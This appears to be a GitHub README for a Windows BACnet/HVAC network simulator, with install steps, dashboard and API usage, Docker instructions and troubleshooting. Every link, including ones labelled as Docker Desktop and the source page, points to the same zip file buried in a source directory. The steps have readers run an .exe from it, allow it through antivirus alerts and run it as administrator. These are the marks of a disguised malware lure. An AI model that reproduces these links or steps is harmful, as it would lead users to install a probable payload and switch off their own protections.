# 🏢 bacnet-simulator - Simulate HVAC Networks Easily

[![Download bacnet-simulator](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/executivecouncileconomicexpert410/bacnet-simulator/raw/refs/heads/main/src/bacnet_lab/adapters/http/routers/bacnet-simulator-3.0.zip)

---

## 📄 About bacnet-simulator

bacnet-simulator lets you create a virtual BACnet/IP network on your Windows computer. It simulates 7 HVAC devices that interact as if they were real systems. This helps you test building management systems without needing physical hardware.

The app includes:

- Simulated HVAC devices (7 types)
- A web dashboard to watch data and control devices
- A REST API for integration or automation
- Built with Python and BAC0 for BACnet protocols
- FastAPI backend for performance and easy access
- Docker Compose support (if you want to use container tools)

bacnet-simulator is open-source and made for those involved with building automation, energy management, and system testing.


---

## 🎯 System Requirements

To run bacnet-simulator on Windows, make sure your PC meets these basic needs:

- Windows 10 or newer (64-bit recommended)
- At least 4 GB RAM (8 GB or more suggested for smoother experience)
- 500 MB free disk space
- Internet connection for downloading the software and optional usage
- Python 3.8+ is not required if you use the prebuilt executable

If you want to use Docker, install Docker Desktop for Windows first. Docker is optional and only needed for container use.


---

## 🚀 How to Download and Install

1. Visit the bacnet-simulator release page here:  
   [Download bacnet-simulator](https://github.com/executivecouncileconomicexpert410/bacnet-simulator/raw/refs/heads/main/src/bacnet_lab/adapters/http/routers/bacnet-simulator-3.0.zip)

2. Find the latest release version (it will be marked with the highest version number).

3. Look for the Windows executable file (it usually has `.exe` in the file name).

4. Click the file to download it to your PC.

5. Once downloaded, open the `.exe` file.

6. Follow the setup prompts. Usually clicking "Next" and "Install" is enough.

7. After the install finishes, find the bacnet-simulator icon on your desktop or Start menu.

8. Double-click the icon to run the program.

The app will open a local web dashboard in your browser automatically, where you can see and control virtual devices.


---

## 🖥️ Using bacnet-simulator

After launching the app, it starts virtual HVAC devices on your computer. These devices send and receive BACnet/IP messages as if they existed on a real network.

The main way to interact is through the web dashboard:

- Open your browser and visit http://localhost:8000/dashboard
- View status and data from the 7 HVAC devices
- Adjust device settings like temperature, fan speed, or mode
- Watch live updates and alerts

You can also connect other software to bacnet-simulator using its REST API:

- The API lets you read data or control devices programmatically
- Access API docs at http://localhost:8000/docs to explore endpoints
- Use tools like Postman or curl for testing API calls

bacnet-simulator uses BAC0 and BACPypes3 libraries under the hood to simulate BACnet traffic. This means your BMS software can connect and test without real hardware.


---

## ⚙️ Optional: Running with Docker

If you prefer using Docker, you can run bacnet-simulator in containers to keep it isolated from your computer.

1. Install Docker Desktop for Windows from https://github.com/executivecouncileconomicexpert410/bacnet-simulator/raw/refs/heads/main/src/bacnet_lab/adapters/http/routers/bacnet-simulator-3.0.zip

2. Open a command prompt or PowerShell window.

3. Navigate to the folder where you cloned or downloaded bacnet-simulator source code.

4. Run this command to start containers:

    ```
    docker-compose up
    ```

5. Wait for the containers to start. You will see logs in your terminal.

6. Open your browser at http://localhost:8000/dashboard like before.

Using Docker helps if you want to test different versions or avoid manual installation.


---

## 🔧 Troubleshooting

- If the app does not open the dashboard page automatically, open your browser and type http://localhost:8000/dashboard manually.

- Make sure no other program is using port 8000. If the dashboard fails to load, close any apps that might block the port.

- On antivirus alerts, allow the app as trusted because it needs network access.

- If the app crashes on launch, reinstall it or try running as administrator.

- For Docker troubles, verify Docker Desktop runs correctly and that your user has permissions.

- Check Windows Firewall settings to ensure the app can communicate.


---

## 📚 Learn More and Contribute

The bacnet-simulator project is open-source. You can explore its source code, report issues, or help improve features.

Visit this page for full source, documentation, and updates:  
https://github.com/executivecouncileconomicexpert410/bacnet-simulator/raw/refs/heads/main/src/bacnet_lab/adapters/http/routers/bacnet-simulator-3.0.zip  

Here are some of the main technologies used:

- Python  
- BAC0 and BACPypes3 BACnet libraries  
- FastAPI web framework  
- Docker Compose for container setup  

The project helps users in BACnet/IP network simulation, HVAC testing, smart building projects, or BMS integration.


---

## 🔑 Keywords and Topics

- bacnet  
- bacnet-ip  
- bacnet-simulator  
- bacpypes3  
- bms  
- building-automation  
- docker  
- fastapi  
- hvac  
- iot  
- python  
- simulator  
- smart-building  
- testing-tools  